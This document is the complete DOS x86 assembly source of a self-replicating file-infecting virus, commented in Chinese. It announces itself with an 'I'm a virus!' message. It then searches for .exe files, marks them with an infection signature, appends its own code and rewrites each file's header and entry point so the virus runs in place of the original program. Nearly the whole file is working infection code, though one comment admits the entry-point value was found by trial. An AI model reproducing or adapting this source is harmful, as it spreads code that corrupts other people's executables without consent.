code segment
    assume cs:code
start:
    mov ax,cs
    mov ds,ax

    call virus
    
    cmp bp,0
    jnz source
    mov ah,4ch
    int 21h
source:
    push cs
    mov oldip,0
    push oldip
    retf

virus proc
    call locate
locate:
    pop bp
    sub bp,offset locate
    lea dx,[bp+offset string] ;输出字符串
    mov ah,09h
    int 21h

    lea dx,[bp+offset dta] ;置dta
    mov ah,1ah
    int 21h

    lea dx,[bp+offset filename] ;查找第一个文件
    mov cx,0
    mov ah,4eh
    int 21h
    jc error

modify:
    lea dx,[bp+offset dta] ;文件名地址
    add dx,1eh
    
    mov ax,3d02h ;打开文件
    int 21h

    mov bx,ax
    
    mov ax,4200h ;到文件头
    xor cx,cx
    xor dx,dx
    int 21h

    mov ah,3fh ;读文件头
    mov cx,30h
    lea dx,[bp+offset head]
    mov si,dx
    int 21h

    cmp word ptr [si],5a4dh ;检查是否是exe
    jnz nextfile

    cmp word ptr [si+2ah],8888h ;检查是否已被感染
    je nextfile
    mov word ptr [si+2ah],8888h

    mov ax,word ptr [si+014h] ;保存原程序入口
    mov oldip,ax

    xor cx,cx ;到文件尾
    xor dx,dx
    mov ax,4202h
    int 21h
                   
    lea dx,[bp+offset start] ;写入代码
    lea cx,[bp+offset theend]
    sub cx,dx
    mov ah,40h
    int 21h

    mov ax,4202h ;计算新文件长度
    xor cx,cx
    xor dx,dx
    int 21h    
    mov cx,200h
    div cx
    inc ax
    mov word ptr [si+2],dx
    mov word ptr [si+4],ax
    
    mov word ptr [si+14h],0012h ;这里我是试出来病毒代码的内存地址的
                                ;99%换个地方就不对了

    mov ax,4200h ;到文件头并改写
    xor cx,cx
    xor dx,dx
    int 21h
    mov ah,40h
    mov dx,si
    mov cx,30h
    int 21h

nextfile:
    mov ah,3eh ;关闭文件
    int 21h

    mov ah,4fh ;查找下一个文件
    int 21h
    jc error
    jmp modify

error:
    ret
virus endp

oldip dw 0
filename db "*.exe",0
dta db 02bh dup(0)
string db "I'm a virus!",13,10,'$'
head db 30h dup(0)

theend:
code ends
end start
